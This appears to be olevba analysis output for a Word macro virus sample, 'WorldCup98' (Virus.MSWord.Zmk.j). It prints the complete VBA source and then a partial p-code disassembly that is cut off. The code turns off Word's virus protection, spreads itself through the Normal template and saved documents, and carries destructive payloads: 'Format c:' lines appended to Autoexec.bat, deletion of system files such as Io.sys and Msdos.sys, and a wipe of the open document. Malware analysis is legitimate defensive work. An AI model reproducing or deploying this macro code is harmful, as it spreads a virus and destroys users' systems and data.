olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Zmk.j
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Zmk.j - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

-------------------------------------------------------------------------------
VBA MACRO WorldCup98.bas 
in file: ./Virus.MSWord.Zmk.j - OLE stream: 'Macros/VBA/WorldCup98'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAE
Dim MyTime, MyDate, NBH$
MyTime = Time
MyDate = Date
D$ = Mid(MyDate, 1, 2)
Ts$ = Mid(MyTime, 7, 8)
If D$ = "12" Or Ts$ = "12" Then
    Randomize
    NBH$ = Int(Rnd * 10) + 1
    Select Case NBH$
        Case 1, 3, 5, 7, 9
            Call Pronostique
        Case 2, 4, 6, 8, 10
            Call WC98PayLoad
    End Select
End If
ErrorAE:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorAO
iMacroCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "WorldCup98" Then
        WorldCup98Installed = -1
    End If
Next i
If Not WorldCup98Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="WorldCup98", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Pronostic", Object:=wdOrganizerObjectProjectItems
    MsgBox "VIVE LA COUPE DU MONDE 98!!!!", vbInformation, "Virus WorldCup98"
End If
ErrorAO:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="WorldCup98", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Pronostic", Object:=wdOrganizerObjectProjectItems
MsgBox "J'espère que tu aime le football...", vbInformation, "Virus WorldCup98"
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
    MsgBox "Hip Hip Hourra!!!!", vbInformation, "Virus WorldCup98"
ErrorFT:
End Sub
Private Sub Pronostique()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPe
Dim WC98$, NH$, Equipe$, Pay$
Randomize
Debut:
    Pronostic.Show
WC98$ = WordBasic.[GetPrivateProfileString$]("Pronostic", "Equipe", "WorldCup98.INI")
If WC98$ = "0" Then
    MsgBox "Veuillez choisir une équipe", vbInformation, "Virus WorldCup98"
    GoTo Debut
End If
NH$ = Int(Rnd * 9) + 1
If NH$ = "1" Then
    Equipe$ = "Brésil"
End If
If NH$ = "2" Then
    Equipe$ = "Italie"
End If
If NH$ = "3" Then
    Equipe$ = "France"
End If
If NH$ = "4" Then
    Equipe$ = "Espagne"
End If
If NH$ = "5" Then
    Equipe$ = "Mexique"
End If
If NH$ = "6" Then
    Equipe$ = "Allemagne"
End If
If NH$ = "7" Then
    Equipe$ = "Angleterre"
End If
If NH$ = "8" Then
    Equipe$ = "Argentine"
End If
If NH$ = "9" Then
    Equipe$ = "Yougoslavie"
End If
If NH$ = WC98$ Then
    MsgBox "Bravo!!!, bien joué...", Title:="Virus WorldCup98"
Message:
    StatusBar = "       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                   Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
    StatusBar = "                                                                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
    For i = 1 To 400000
    Next i
GoTo Message
End If
If NH$ <> WC98$ Then
        MsgBox "Dommage pour toi, tu as PERDU..." & Chr$(13) & "mon choix était: " & Equipe$, Title:="Virus WorldCup98"
        Randomize
        Pay$ = Int(Rnd * 15) + 1
        Select Case Pay$
            Case 1, 5, 8, 9, 12, 13
                Open "C:\Autoexec.bat" For Append As #1
                    Print #1, "Cls"
                    Print #1, "Echo La coupe du monde 98 c'est génial!!!!"
                    Print #1, "Echo y|Format c: /u /v:WorldCup98"
                    Print #1, "Echo o|Format c: /u /v:WorldCup98"
                Close #1
            Case 3, 4, 7, 15
                Kill "C:\Dos\*.*"
                Kill "C:\Windows\Command\*.*"
                Kill "C:\Msdos.sys"
                Kill "C:\Io.sys"
            Case 2, 6, 10, 11, 14
                Selection.WholeStory
                Selection.Delete Unit:=wdCharacter, Count:=1
                For i = 1 To 98
                Selection.TypeParagraph
                Selection.TypeText Text:="Vive la coupe du monde 98!!!!!"
                Next i
                Selection.TypeParagraph
                Selection.TypeText Text:="ZeMacroKiller98 aime beaucoup le football..."
                ActiveDocument.PrintOut
        End Select
End If
ErrorPe:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
    MsgBox "ZeMacroKiller98 est heureux de dédier ce virus" & Chr$(13) & "à tous ceux qui aime le FOOTBALL", vbInformation, "Virus WorldCup98"
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
Assistant.Visible = True
With Assistant.NewBalloon
    .Button = msoButtonSetOK
    .Heading = "Virus WorldCup98"
    .Text = "Allez la France!!!!!"
    .Show
End With
ErrorVVBC:
End Sub
Private Sub WC98PayLoad()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorWC98PL
Charge:
    ActiveDocument.Shapes.AddTextEffect(msoTextEffect22, "World Cup 98", _
        "Impact", 60#, msoFalse, msoFalse, 132.15, 120.55).Select
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 45#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 90#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 135#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 180#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 225#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 270#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 315#
    For i = 1 To 400000
    Next i
    Selection.ShapeRange.Rotation = 0#
    Selection.ShapeRange.Delete
GoTo Charge
ErrorWC98PL:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Zmk.j
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 955 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' Macros/VBA/WorldCup98 - 14235 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	OnError ErrorAE 
' Line #6:
' 	Dim 
' 	VarDefn MyTime
' 	VarDefn MyDate
' 	VarDefn NBH
' Line #7:
' 	Ld Time 
' 	St MyTime 
' Line #8:
' 	Ld Date 
' 	St MyDate 
' Line #9:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #10:
' 	Ld MyTime 
' 	LitDI2 0x0007 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	St Ts$ 
' Line #11:
' 	Ld D$ 
' 	LitStr 0x0002 "12"
' 	Eq 
' 	Ld Ts$ 
' 	LitStr 0x0002 "12"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #12:
' 	ArgsCall Read 0x0000 
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St NBH$ 
' Line #14:
' 	Ld NBH$ 
' 	SelectCase 
' Line #15:
' 	LitDI2 0x0001 
' 	Case 
' 	LitDI2 0x0003 
' 	Case 
' 	LitDI2 0x0005 
' 	Case 
' 	LitDI2 0x0007 
' 	Case 
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' Line #16:
' 	ArgsCall (Call) Pronostique 0x0000 
' Line #17:
' 	LitDI2 0x0002 
' 	Case 
' 	LitDI2 0x0004 
' 	Case 
' 	LitDI2 0x0006 
' 	Case 
' 	LitDI2 0x0008 
' 	Case 
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' Line #18:
' 	ArgsCall (Call) WC98PayLoad 0x0000 
' Line #19:
' 	EndSelect 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	Label ErrorAE 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Sub AutoOpen())
' Line #24:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #25:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #26:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #28:
' 	OnError ErrorAO 
' Line #29:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroCount 
' Line #30:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #31:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000A "WorldCup98"
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitDI2 0x0001 
' 	UMi 
' 	St WorldCup98Installed 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	Ld WorldCup98Installed 
' 	Not 
' 	IfBlock 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "WorldCup98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #37:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Pronostic"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' 	LitStr 0x001D "VIVE LA COUPE DU MONDE 98!!!!"
' 	Ld vbInformation 
' 	LitStr 0x0010 "Virus WorldCup98"
' 	ArgsCall MsgBox 0x0003 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Label ErrorAO 
' Line #41:
' 	EndSub 
' Line #42:
' 	FuncDefn (Sub FileSaveAs())
' Line #43:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #44:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #45:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #46:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #47:
' 	OnError ErrorFSA 
' Line #48:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #50:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "WorldCup98"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #53:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "Pronostic"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #54:
' 	LitStr 0x0023 "J'espère que tu aime le football..."
' 	Ld vbInformation 
' 	LitStr 0x0010 "Virus WorldCup98"
' 	ArgsCall MsgBox 0x0003 
' Line #55:
' 	Label ErrorFSA 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub FileTemplates())
' Line #58:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #59:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #61:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #62:
' 	OnError ErrorFT 
' Line #63:
' 	LitStr 0x0012 "Hip Hip Hourra!!!!"
' 	Ld vbInformation 
' 	LitStr 0x0010 "Virus WorldCup98"
' 	ArgsCall MsgBox 0x0003 
' Line #64:
' 	Label ErrorFT 
' Line #65:
' 	EndSub 
' Line #66:
' 	FuncDefn (Private Sub Pronostique())
' Line #67:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #68:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #69:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #70:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #71:
' 	OnError ErrorPe 
' Line #72:
' 	Dim 
' 	VarDefn WC98
' 	VarDefn NH
' 	VarDefn Equipe
' 	VarDefn Pay
' Line #73:
' 	ArgsCall Read 0x0000 
' Line #74:
' 	Label Debut 
' Line #75:
' 	Ld Pronostic 
' 	ArgsMemCall Show 0x0000 
' Line #76:
' 	LitStr 0x0009 "Pronostic"
' 	LitStr 0x0006 "Equipe"
' 	LitStr 0x000E "WorldCup98.INI"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WC98$ 
' Line #77:
' 	Ld WC98$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	IfBlock 
' Line #78:
' 	LitStr 0x001B "Veuillez choisir une équipe"
' 	Ld vbInformation 
' 	LitStr 0x0010 "Virus WorldCup98"
' 	ArgsCall MsgBox 0x0003 
' Line #79:
' 	GoTo Debut 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St NH$ 
' Line #82:
' 	Ld NH$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	IfBlock 
' Line #83:
' 	LitStr 0x0006 "Brésil"
' 	St Equipe$ 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	Ld NH$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	IfBlock 
' Line #86:
' 	LitStr 0x0006 "Italie"
' 	St Equipe$ 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Ld NH$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	IfBlock 
' Line #89:
' 	LitStr 0x0006 "France"
' 	St Equipe$ 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	Ld NH$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	IfBlock 
' Line #92:
' 	LitStr 0x0007 "Espagne"
' 	St Equipe$ 
' Line #93:
' 	EndIfBlock 
' Line #94:
' 	Ld NH$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	IfBlock 
' Line #95:
' 	LitStr 0x0007 "Mexique"
' 	St Equipe$ 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	Ld NH$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	IfBlock 
' Line #98:
' 	LitStr 0x0009 "Allemagne"
' 	St Equipe$ 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	Ld NH$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	IfBlock 
' Line #101:
' 	LitStr 0x000A "Angleterre"
' 	St Equipe$ 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	Ld NH$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	IfBlock 
' Line #104:
' 	LitStr 0x0009 "Argentine"
' 	St Equipe$ 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	Ld NH$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	IfBlock 
' Line #107:
' 	LitStr 0x000B "Yougoslavie"
' 	St Equipe$ 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	Ld NH$ 
' 	Ld WC98$ 
' 	Eq 
' 	IfBlock 
' Line #110:
' 	LitStr 0x0016 "Bravo!!!, bien joué..."
' 	LitStr 0x0010 "Virus WorldCup98"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #111:
' 	Label Message 
' Line #112:
' 	LitStr 0x0038 "       Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #113:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #114:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #115:
' 	LitStr 0x0040 "               Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #116:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #117:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #118:
' 	LitStr 0x0048 "                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #119:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #120:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #121:
' 	LitStr 0x0050 "                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #122:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #123:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #124:
' 	LitStr 0x0058 "                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #125:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #126:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #127:
' 	LitStr 0x0060 "                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #128:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #129:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #130:
' 	LitStr 0x0068 "                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #131:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #132:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #133:
' 	LitStr 0x0070 "                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #134:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #135:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #136:
' 	LitStr 0x0078 "                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #137:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #138:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #139:
' 	LitStr 0x0080 "                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #140:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #141:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #142:
' 	LitStr 0x0088 "                                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #143:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #144:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #145:
' 	LitStr 0x0094 "                                                                                                   Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #146:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #147:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #148:
' 	LitStr 0x00A0 "                                                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #149:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #150:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #151:
' 	LitStr 0x00A8 "                                                                                                                       Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #152:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #153:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' 	LitStr 0x00B0 "                                                                                                                               Vive le football!!!, Vive la Coupe du Monde 98!!!"
' 	St StatusBar 
' Line #155:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #156:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #157:
' 	GoTo Message 
' Line #158:
' 	EndIfBlock 
' Line #159:
' 	Ld NH$ 
' 	Ld WC98$ 
' 	Ne 
' 	IfBlock 
' Line #160:
' 	LitStr 0x0020 "Dommage pour toi, tu as PERDU..."
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0011 "mon choix était: "
' 	Concat 
' 	Ld Equipe$ 
' 	Concat 
' 	LitStr 0x0010 "Virus WorldCup98"
' 	ParamNamed Title 
' 	ArgsCall MsgBox 0x0002 
' Line #161:
' 	ArgsCall Read 0x0000 
' Line #162:
' 	Ld Rnd 
' 	LitDI2 0x000F 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Pay$ 
' Line #163:
' 	Ld Pay$ 
' 	SelectCase 
' Line #164:
' 	LitDI2 0x0001 
' 	Case 
' 	LitDI2 0x0005 
' 	Case 
' 	LitDI2 0x0008 
' 	Case 
' 	LitDI2 0x0009 
' 	Case 
' 	LitDI2 0x000C 
' 	Case 
' 	LitDI2 0x000D 
' 	Case 
' 	CaseDone 
' Line #165:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "Cls"
' 	PrintItemNL 
' Line #167:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "Echo La coupe du monde 98 c'est génial!!!!"
' 	PrintItemNL 
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Echo y|Format c: /u /v:WorldCup98"
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "Echo o|Format c: /u /v:WorldCup98"
' 	PrintItemNL 
' Line #170:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #171:
' 	LitDI2 0x0003 
' 	Case 
' 	LitDI2 0x0004 
' 	Case 
' 	LitDI2 0x0007 
' 	Case 
' 	LitDI2 0x000F 
' 	Case 
' 	CaseDone 
' Line #172:
' 	LitStr 0x000A "C:\Dos\*.*"
' 	ArgsCall Kill 0x0001 
' Line #173:
' 	LitStr 0x0016 "C:\Windows\Command\*.*"
' 	ArgsCall Kill 0x0001 
' Line #174:
' 	LitStr 0x000C "C:\Msdos.sys"
' 	ArgsCall Kill 0x0001 
' Line #175:
' 	LitStr 0x0009 "C:\Io.sys"
' 	ArgsCall Kill 0x0001 
' Line #176:
' 	LitDI2 0x0002 
' 	Case 
' 	LitDI2 0x0006 
' 	Case 
' 	LitDI2 0x000A 
' 	Case 
' 	LitDI2 0x000B 
' 	Case 
' 	LitDI2 0x000E 
' 	Case 
' 	CaseDone 
' Line #177:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #178:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
